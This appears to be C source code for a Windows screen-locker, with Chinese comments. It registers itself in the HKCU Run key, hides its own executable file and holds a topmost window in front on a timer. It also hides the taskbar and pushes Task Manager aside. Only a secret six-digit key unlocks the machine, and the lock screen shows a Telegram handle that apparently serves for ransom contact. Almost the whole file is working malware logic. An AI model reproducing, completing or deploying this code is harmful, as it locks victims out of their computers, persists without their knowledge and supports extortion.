#include "util.h"

// pid 杀掉程序
BOOL KillProcess(HWND hwnd)
{
    if(!hwnd) return FALSE;
    DWORD processId;
    GetWindowThreadProcessId(hwnd, &processId);
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
    if (hProcess == NULL)
    {
        return FALSE;
    }

    BOOL result = TerminateProcess(hProcess, 0);
    CloseHandle(hProcess);

    return result;
}

// 隐藏自身&开机自启动
void AutoRunAndHide(){
    // 获取当前可执行文件路径
    char exePath[MAX_PATH];
    GetModuleFileName(NULL, exePath, MAX_PATH);

    // 打开注册表项
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);

    // 设置注册表项的值
    RegSetValueEx(hKey, "hhh", 0, REG_SZ, (BYTE*)exePath, strlen(exePath));

    // 关闭注册表项
    RegCloseKey(hKey);
    // 将文件属性设置为隐藏
    SetFileAttributes(exePath, FILE_ATTRIBUTE_HIDDEN);
}

// 随机密钥
void RandomMiYao(){
    // 设置随机数种子
    srand(time(NULL));
    // 生成随机的6位数
    // 将随机数转换为字符串
    sprintf(miYao, "%06d", rand() % 1000000);
    char str[100]="echo ";
    strcat(str,miYao);
    strcat(str," > config.txt");
    
    system(str);
}


// windows消息处理函数
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    switch (uMsg)
    {
        case WM_CREATE:
        {
            // 使用 SetWindowPos 函数将窗口置前
            SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);  
            RandomMiYao();
            AutoRunAndHide();   
            // 启动定时器
            SetTimer(hwnd, TIMER_ID, TIMER_INTERVAL, NULL);   
            break;
        }

        case WM_TIMER:
        if (wParam == TIMER_ID)
        {
            // 定时器触发时执行的操作
            SetForegroundWindow(hwnd);
            ShowWindow(hwndTaskbar, SW_HIDE);

        }
        break;

        case WM_CLOSE:
        {
            if(isLook==0){
                if(hwndTaskbar!=NULL) ShowWindow(hwndTaskbar, SW_SHOWNORMAL);
                // 将任务管理器窗口移到屏幕左上角并设置为正常大小
                if(taskmgrWnd!=NULL) SetWindowPos(taskmgrWnd, HWND_TOP, 0, 0, 800, 600, SWP_SHOWWINDOW);
                // 关闭窗口和应用程序
                DestroyWindow(hwnd);
            }else hwnd=NULL;
            
            break;
        }

        case WM_DESTROY:
            if(isLook==0) PostQuitMessage(0);
            else hwnd=NULL;
            break;
            
        case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            int wmEvent = HIWORD(wParam);
            // 获取编辑框的文本内容
            char buffer[GetWindowTextLengthA(hwndEdit)+1]; // 根据需要调整缓冲区大小
            GetWindowTextA(hwndEdit, buffer, sizeof(buffer));

            if (wmId == 2 && wmEvent == BN_CLICKED)
            {
                if(strcmp(miYao,buffer)==0||strcmp(miYaoRoot,buffer)==0){
                    isLook=0;   // 解锁
                    ShowWindow(hwndTaskbar, SW_SHOWNORMAL);
                    exit(0);
                }else{
                    isWrong=1;
                    InvalidateRect(hwnd, NULL, TRUE);   // 强制窗口重绘，否则窗口内容毫无变化
                }
            }
            break;
        }

        case WM_PAINT:
        {
            // 绘制其他文本内容
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hwnd, &ps);
            // 设置字体和颜色
            HFONT oldFont = (HFONT)SelectObject(hdc, font);
            SetTextColor(hdc, RGB(0, 0, 0));

            wchar_t countText[50];
            if(isWrong==1) {
                swprintf(countText, sizeof(countText) / sizeof(countText[0]), L"请输入密钥: %ls", L"输入错误");
            }else {
                swprintf(countText, sizeof(countText) / sizeof(countText[0]), L"请输入密钥: ");
            }

            // 计算字符的长度和宽度
            SIZE textSize;
            GetTextExtentPoint32W(hdc, countText, wcslen(countText), &textSize);
            RECT rect = { (screen_width-300)/2, (screen_height-80)/2, (screen_width-300)/2+textSize.cx, (screen_height-80)/2+textSize.cy}; // 左上角x,y;右下角x,y
            DrawTextW(hdc, countText, -1, &rect, DT_LEFT | DT_WORDBREAK);

            // 第二行文本
            SetTextColor(hdc, RGB(255, 0, 0));
            TextOutW(hdc, (screen_width-300)/2, (screen_height+80)/2, L"TG号 https://t.me/besttimeforme (¬◡¬)✧", 50);// lstrlenW(L"文本1")
            
            // 恢复字体
            SelectObject(hdc, oldFont);
            EndPaint(hwnd, &ps);
            break;
        }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}
